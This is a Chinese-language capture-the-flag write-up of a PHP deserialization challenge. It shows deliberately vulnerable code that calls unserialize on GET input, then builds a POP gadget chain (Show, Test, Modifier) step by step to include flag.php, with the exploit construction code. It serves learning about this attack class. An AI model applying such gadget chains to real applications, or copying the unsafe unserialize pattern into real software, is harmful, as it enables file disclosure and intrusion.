---
Date: 2026-01-29
tags:
  - PHP
  - pop
  - serialize
---
```php
<?php  
//flag is in flag.php  
highlight_file(__FILE__);  
error_reporting(0);  
class Modifier {  
    private $var;  
    public function append($value)  
    {  
        include($value);  
        echo $flag;  
    }  
    public function __invoke(){        $this->append($this->var);  
    }  
}  
  
class Show{  
    public $source;  
    public $str;  
    public function __toString(){  
        return $this->str->source;  
    }  
    public function __wakeup(){  
        echo $this->source;  
    }  
}  
  
class Test{  
    public $p;  
    public function __construct(){        $this->p = array();  
    }  
  
    public function __get($key){        $function = $this->p;  
        return $function();  
    }  
}  
  
if(isset($_GET['pop'])){    unserialize($_GET['pop']);  
}  
?>
```
分析：
-1.已知flag的位置，并且`class modifier`出现了`echo $flag`的标识，推测需要触发`echo`调用`$flag`
-2.需要给append赋值为`flag.php`，则需要调用到当前类的invoke，意味着需要对象被当作函数触发
-3.紧接着需要实例化一个对象并且被当作函数`xx()`触发，定位到`class Test`里面的最后`$function()
-4.`$function`会被赋值为`$p`的值，需要考虑get触发，即调用不存在的属性`
-5.`class Show`里面的`tostring`则有一连串调用，将`str`实例化一个对象`Test`即可
-6.调用`tostring`，则剩下`wakeup`没被调用，此时只需要反序列化即可调用，并且将`Show->source`赋值为当前类即可

构造如下
```php
$a = new Show();
$a->source = new Show();//echo对象，触发show里面的tostring
  

$b = new Test();
$a->source->str = $b;

//触发test的get方法，也就是调用了不存在的对象，因此执行了后续赋值.注意，这里需要紧接上步$a->source，source现在是新的对象，因此需要再次调用source里面的str，而不能直接用$a->str

//这里调用了tostring后this是source这个新的类，因此需要在source里面继续赋值str属性

  

$c = new Modifier();
$b ->p = $c;//触发modifier的invoke方法


//序列化对象
echo serialize($a);
$s = serialize($a);
//注意构造时候将私有属性var直接更改
private $var = 'flag.php';

echo "\n";
echo unserialize($s);
```



